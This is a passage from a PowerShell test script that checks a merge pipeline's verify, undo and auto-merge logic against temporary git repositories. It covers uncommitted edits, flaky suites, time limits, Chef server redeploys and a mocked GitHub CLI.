    Check 'verify, uncommitted edits on main: held (exit 10), says NOT verified' ($LASTEXITCODE -eq 10 -and $vOut14 -match 'uncommitted' -and $vOut14 -match 'NOT verified')
    Check 'verify, uncommitted edits on main: main keeps the merge, the work is untouched' ((& git -C $vr log -1 --format=%s) -match '^Merge kitchen/J14' -and (Get-Content (Join-Path $vr 'good.txt') -Raw).Trim() -eq 'someone is editing this')
    & git -C $vr checkout -q -- good.txt 2>&1 | Out-Null
    & git -C $vr checkout -q -b side 2>&1 | Out-Null
    $vOutSide = & pwsh -NoProfile -File $verifyScript -Repo $vr 2>&1 | Out-String
    Check "verify, checkout off main: held (exit 10), says so" ($LASTEXITCODE -eq 10 -and $vOutSide -match "on 'side', not main")
    $uSide = (& pwsh -NoProfile -File (Join-Path $kd 'undo-merge.ps1') -Job J14 -Repo $vr -Json | Out-String) | ConvertFrom-Json
    Check 'undo, checkout off main: refused, nothing reverted' (-not $uSide.ok -and $uSide.message -match 'not main' -and (& git -C $vr log -1 --format=%s) -match '^Merge kitchen/J14')
    & git -C $vr checkout -q main 2>&1 | Out-Null

    # breaks main but the undo is refused (later work builds on the merge): never claim an undo, say it needs a look
    Set-Content (Join-Path $vr 'broken.txt') 'built on by later work'
    & git -C $vr add -A 2>&1 | Out-Null; & git -C $vr -c user.name=t -c user.email=t@localhost commit -q -m "later work" 2>&1 | Out-Null
    $vOut14 = & pwsh -NoProfile -File $verifyScript -Repo $vr 2>&1 | Out-String
    Check 'verify, undo refused: exit 1 and says so' ($LASTEXITCODE -eq 1 -and $vOut14 -match 'undo refused')
    Check 'verify, undo refused: main keeps the merge and the later work' ((& git -C $vr log -1 --format=%s) -eq 'later work' -and -not @(& git -C $vr log --format=%s --grep='^Undo J14').Count)
    $ev14 = @(Get-Content (Join-Path $root 'events.jsonl') | ForEach-Object { try { $_ | ConvertFrom-Json } catch { } } | Where-Object { $_.job -eq 'J14' })
    Check 'verify, undo refused: merge.broken event, no merge.undone' (@($ev14 | Where-Object type -eq 'merge.broken').Count -eq 1 -and -not @($ev14 | Where-Object type -eq 'merge.undone').Count)
    Check 'verify, undo refused: the alert does not claim an undo' ((Get-Content $notifyLog -Raw) -match 'J14 broke main and could not be undone' -and (Get-Content $notifyLog -Raw) -notmatch 'J14 was undone')
    & git -C $vr rm -q broken.txt 2>&1 | Out-Null; & git -C $vr -c user.name=t -c user.email=t@localhost commit -q -m "fix main by hand" 2>&1 | Out-Null
    # a suite that dies before its summary (a busy PC) and passes on a second run is flaky, not broken: the merge stays, verify.flaky is logged, no alert
    $env:KITCHEN_JOB = 'J15'
    & git -C $vr checkout -q -b kitchen/J15 2>&1 | Out-Null
    Set-Content (Join-Path $vr 'harmless.txt') 'fine'
    & git -C $vr add -A 2>&1 | Out-Null; & git -C $vr -c user.name=t -c user.email=t@localhost commit -q -m "harmless" 2>&1 | Out-Null
    & git -C $vr checkout -q main 2>&1 | Out-Null
    & git -C $vr -c user.name=t -c user.email=t@localhost merge -q --no-ff kitchen/J15 -m 'Merge kitchen/J15 (kitchen J15, approved by Jordan)' 2>&1 | Out-Null
    # the mark sits in a Low-labelled folder: the tests station runs suites at Low integrity (rust/kitchen-sandbox)
    $fmd = Join-Path $root 'lowmarks'; New-Item -ItemType Directory -Force -Path $fmd | Out-Null; & icacls.exe $fmd /setintegritylevel '(OI)(CI)low' /Q 2>&1 | Out-Null
    $env:FLAKY_MARK = Join-Path $fmd 'flaky-once.txt'; Set-Content $env:FLAKY_MARK '2'   # dies twice (the station's own retry too), then passes
    Hold-Train 'J15'
    $vOut15 = & pwsh -NoProfile -File $verifyScript -Repo $vr 2>&1 | Out-String; $v15 = $LASTEXITCODE; $env:FLAKY_MARK = $null
    $ev15 = @(Get-Content (Join-Path $root 'events.jsonl') | ForEach-Object { try { $_ | ConvertFrom-Json } catch { } } | Where-Object { $_.job -eq 'J15' })
    Check 'verify passes: the merge train is released' (-not (Test-Path $trainP))
    Check 'verify, flaky suite: passes on the second run, merge kept' ($v15 -eq 0 -and $vOut15 -match 'flaky, not broken' -and (& git -C $vr log -1 --format=%s) -match '^Merge kitchen/J15')
    Check 'verify, flaky suite: verify.flaky logged, no undo, no alert naming the order' (@($ev15 | Where-Object type -eq 'verify.flaky').Count -eq 1 -and -not @($ev15 | Where-Object type -eq 'merge.undone').Count -and (Get-Content $notifyLog -Raw) -notmatch 'J15')
    Check 'verify, flaky suite: auto-merge paused for 24 h (automerge.pause logged)' (@(Get-Content (Join-Path $root 'automerged.jsonl') | ForEach-Object { try { $_ | ConvertFrom-Json } catch { } } | Where-Object { $_.type -eq 'automerge.pause' -and $_.job -eq 'J15' }).Count -eq 1)
    # TD-EH-11: the pause is told: one alert in fixed words, and automerge-paused.json for the Board (until, 1 flaky check, the suite)
    $am15 = Get-Content (Join-Path $root 'automerge-paused.json') -Raw -ErrorAction SilentlyContinue | ConvertFrom-Json
    Check 'verify, flaky suite: the pause raises one alert (fixed words, no order named)' (@(Get-Content $notifyLog | Where-Object { $_ -eq 'MED|test-topic-12345|Auto-merge paused for 24 h: a check on main passed only on a retry' }).Count -eq 1)
    Check 'verify, flaky suite: the Board is told until when, after how many flaky checks, which suite' ($am15 -and $am15.flaky -eq 1 -and (@($am15.suites) -join ',') -eq 'Test-Suite1' -and (([DateTime]$am15.until).ToUniversalTime() - [DateTime]::UtcNow).TotalHours -gt 23.5 -and $vOut15 -match 'auto-merge paused until \S+ after 1 flaky check \(Test-Suite1\)')
    Check 'verify, flaky suite: automerge.ps1 holds while the Board shows the pause' (-not (Am 'J1').ok -and (Am 'J1').why -match 'flaky')

    # the same flaky suite when the step's time limit leaves no room for the slow rerun: counted as broken and undone before the
    # supervisor would stop verify (a stopped verify never reaches its undo)
    $env:KITCHEN_JOB = 'J16'
    & git -C $vr checkout -q -b kitchen/J16 2>&1 | Out-Null
    Set-Content (Join-Path $vr 'late.txt') 'fine'
    & git -C $vr add -A 2>&1 | Out-Null; & git -C $vr -c user.name=t -c user.email=t@localhost commit -q -m "late" 2>&1 | Out-Null
    & git -C $vr checkout -q main 2>&1 | Out-Null
    & git -C $vr -c user.name=t -c user.email=t@localhost merge -q --no-ff kitchen/J16 -m 'Merge kitchen/J16 (kitchen J16, approved by Jordan)' 2>&1 | Out-Null
    # the mark sits in a Low-labelled folder: the tests station runs suites at Low integrity (rust/kitchen-sandbox)
$fmd = Join-Path $root 'lowmarks'; New-Item -ItemType Directory -Force -Path $fmd | Out-Null; & icacls.exe $fmd /setintegritylevel '(OI)(CI)low' /Q 2>&1 | Out-Null
$env:FLAKY_MARK = Join-Path $fmd 'flaky-once.txt'; Set-Content $env:FLAKY_MARK '2'; $env:KITCHEN_TIMEOUT = '600'
    $vOut16 = & pwsh -NoProfile -File $verifyScript -Repo $vr 2>&1 | Out-String; $v16 = $LASTEXITCODE; $env:FLAKY_MARK = $null; $env:KITCHEN_TIMEOUT = $null
    Check 'verify near its time limit: no slow rerun, the merge is undone' ($v16 -eq 1 -and $vOut16 -match 'no time left' -and (& git -C $vr log -1 --format=%s) -match '^Undo J16')
    Remove-Item -LiteralPath (Join-Path $root 'flaky-once.txt') -ErrorAction SilentlyContinue

    # an undone merge that changed the Chef server puts the reverted server live again (Chef never keeps code main no longer has)
    $env:KITCHEN_JOB = 'J17'
    & git -C $vr checkout -q -b kitchen/J17 2>&1 | Out-Null
    New-Item -ItemType Directory -Force (Join-Path $vr 'pass-app') | Out-Null
    Set-Content (Join-Path $vr 'pass-app\server.mjs') '// changed'; Set-Content (Join-Path $vr 'broken.txt') 'breaks it'
    & git -C $vr add -A 2>&1 | Out-Null; & git -C $vr -c user.name=t -c user.email=t@localhost commit -q -m "server change" 2>&1 | Out-Null
    & git -C $vr checkout -q main 2>&1 | Out-Null
    & git -C $vr -c user.name=t -c user.email=t@localhost merge -q --no-ff kitchen/J17 -m 'Merge kitchen/J17 (kitchen J17, approved by Jordan)' 2>&1 | Out-Null
    $chefMark = Join-Path $root 'chef-ran.txt'; $mockUpd = Join-Path $root 'mock-update.ps1'
    Set-Content $mockUpd "Set-Content -LiteralPath '$chefMark' -Value 'ran'; 'mock update ok'; exit 0"
    $env:KITCHEN_CHEF_UPDATE_SCRIPT = $mockUpd
    $vOut17 = & pwsh -NoProfile -File $verifyScript -Repo $vr 2>&1 | Out-String; $v17 = $LASTEXITCODE; $env:KITCHEN_CHEF_UPDATE_SCRIPT = $null
    Check 'verify undo of a Chef server change: the reverted server goes live' ($v17 -eq 1 -and (Test-Path $chefMark) -and (Get-Content (Join-Path $root 'events.jsonl') -Raw) -match '"type":"chef.updated","job":"J17"')
    Check 'verify undo of a non-server change: no Chef update' ((Get-Content (Join-Path $root 'events.jsonl') -Raw) -notmatch '"type":"chef\.[a-z.]+","job":"J1[246]"')

    # Post-merge passing test: kitchen/J13
    $env:KITCHEN_JOB = 'J13'
    & git -C $vr checkout -q -b kitchen/J13 2>&1 | Out-Null
    Set-Content (Join-Path $vr 'feature.txt') 'feature works'
    & git -C $vr add -A 2>&1 | Out-Null
    & git -C $vr -c user.name=t -c user.email=t@localhost commit -q -m "passing feature" 2>&1 | Out-Null
    & git -C $vr checkout -q main 2>&1 | Out-Null
    & git -C $vr -c user.name=t -c user.email=t@localhost merge -q --no-ff kitchen/J13 -m 'Merge kitchen/J13 (kitchen J13, approved by Jordan)' 2>&1 | Out-Null
    $j13MergeSha = (& git -C $vr rev-parse HEAD).Trim()

    $vOutPass = & pwsh -NoProfile -File $verifyScript -Repo $vr 2>&1 | Out-String
    $vCodePass = $LASTEXITCODE

    Check 'verify passing: exits 0' ($vCodePass -eq 0)
    Check 'verify passing: head remains merge commit' ((& git -C $vr rev-parse HEAD).Trim() -eq $j13MergeSha)
    Check 'verify passing: output matches ALL PASS' ($vOutPass -match 'ALL PASS')
    $eventsAfter = @(Get-Content (Join-Path $root 'events.jsonl') -ErrorAction SilentlyContinue | ForEach-Object { try { $_ | ConvertFrom-Json } catch { } })
    $undoneJ13 = @($eventsAfter | Where-Object { $_.type -eq 'merge.undone' -and $_.job -eq 'J13' })
    Check 'verify passing: no merge.undone event for J13' ($undoneJ13.Count -eq 0)

    # PreScan_FakeGhCalls_0 (TARGET W2): the supervisor's pre-scan runs automerge -ReadOnly, which reads the saved CI look and never calls gh;
    # the chores take the looks. A merge-gate order with a PR and no look, and a fake gh that counts its calls.
    $pk = "$root-pre"; $prr = Join-Path $pk 'repo'; New-Item -ItemType Directory -Force -Path (Join-Path $pk 'jobs'), (Join-Path $pk 'results'), $prr | Out-Null
    & git -C $prr init -q -b main 2>&1 | Out-Null; Set-Content "$prr\a.txt" 'base'
    & git -C $prr -c user.name=t -c user.email=t@localhost add -A 2>&1 | Out-Null; & git -C $prr -c user.name=t -c user.email=t@localhost commit -q -m base 2>&1 | Out-Null; & git -C $prr branch kitchen/J1 2>&1 | Out-Null
    $ptip = (& git -C $prr rev-parse kitchen/J1).Trim()
    @{ id = 'J1'; name = 'improve: pre'; recipe = 'improve'; status = 'pending'; cursor = 0; attempt = 0; history = @(); steps = @(@{ script = (Join-Path $kd 'stations\merge.ps1'); approve = $true; args = @{ Repo = $prr }; timeoutSec = 60; maxMB = 500; retries = 0 }) } | ConvertTo-Json -Depth 6 | Set-Content (Join-Path $pk 'jobs\J1.json')
    @{ job = 'J1'; number = 1; repo = 'o/r'; url = 'https://github.com/o/r/pull/1' } | ConvertTo-Json | Set-Content (Join-Path $pk 'results\J1.pr.json')
    @{ choresTaskAt = [DateTime]::UtcNow.ToString('o') } | ConvertTo-Json | Set-Content (Join-Path $pk 'supervisor.json')   # (the chores run elsewhere)
    $ghLog = Join-Path $pk 'gh-calls.txt'; $fakeGh = Join-Path $pk 'count-gh.ps1'; Set-Content $fakeGh "Add-Content -LiteralPath '$ghLog' -Value (`$args -join ' '); exit 1"
    $saveGh = $env:KITCHEN_GH; $env:KITCHEN_GH = $fakeGh; $env:BRAIN_KITCHEN = $pk
    try {
        & pwsh -NoProfile -File (Join-Path $kd 'kitchen.ps1') tick -Quiet | Out-Null
        $pj = Get-Content (Join-Path $pk 'jobs\J1.json') -Raw | ConvertFrom-Json
        Check 'PreScan_FakeGhCalls_0: a tick with a PR order at its merge gate calls gh 0 times and asks Jordan' (-not (Test-Path $ghLog) -and $pj.status -eq 'waiting-approval')
        $ro = (& pwsh -NoProfile -File (Join-Path $kd 'automerge.ps1') -Job J1 -Json -ReadOnly | Out-String) | ConvertFrom-Json
        Check 'automerge -ReadOnly: no saved look -> not ok, still 0 gh calls' (-not $ro.ok -and -not (Test-Path $ghLog))
        $null = Am 'J1'
        Check 'without -ReadOnly the same order does take a look (the setup reaches gh)' (@(Get-Content $ghLog -ErrorAction SilentlyContinue).Count -ge 1)
        $look = @{ job = 'J1'; number = 1; state = 'merged'; head = $ptip; allSuccess = $true; at = [DateTime]::UtcNow.AddMinutes(-5).ToString('o') }
        $look | ConvertTo-Json | Set-Content (Join-Path $pk 'results\J1.ci.json'); $n0 = @(Get-Content $ghLog).Count
        $ro = (& pwsh -NoProfile -File (Join-Path $kd 'automerge.ps1') -Job J1 -Json -ReadOnly | Out-String) | ConvertFrom-Json
        Check 'automerge -ReadOnly: a 5-minute-old look is used (Jordan merged on GitHub), no new gh call' ($ro.ok -and $ro.kind -eq 'github' -and @(Get-Content $ghLog).Count -eq $n0)
        $look.at = [DateTime]::UtcNow.AddMinutes(-11).ToString('o'); $look | ConvertTo-Json | Set-Content (Join-Path $pk 'results\J1.ci.json')
        $ro = (& pwsh -NoProfile -File (Join-Path $kd 'automerge.ps1') -Job J1 -Json -ReadOnly | Out-String) | ConvertFrom-Json
        Check 'automerge -ReadOnly: a look over 10 minutes old is not trusted' (-not $ro.ok -and @(Get-Content $ghLog).Count -eq $n0)
    } finally { $env:KITCHEN_GH = $saveGh; $env:BRAIN_KITCHEN = $root; Remove-Item -LiteralPath $pk -Recurse -Force -ErrorAction SilentlyContinue }
} finally {
    $env:BRAIN_KITCHEN = $save
    $env:BRAIN_NTFY_TOPIC = $saveTopic
    $env:KITCHEN_NOTIFY_LOG = $saveNLog
    $env:KITCHEN_JOB = $saveJob
    Remove-Item -LiteralPath $root -Recurse -Force -ErrorAction SilentlyContinue
}
Write-Output "AutoMerge tests: $script:pass passed, $script:fail failed"
exit ([int]($script:fail -gt 0))
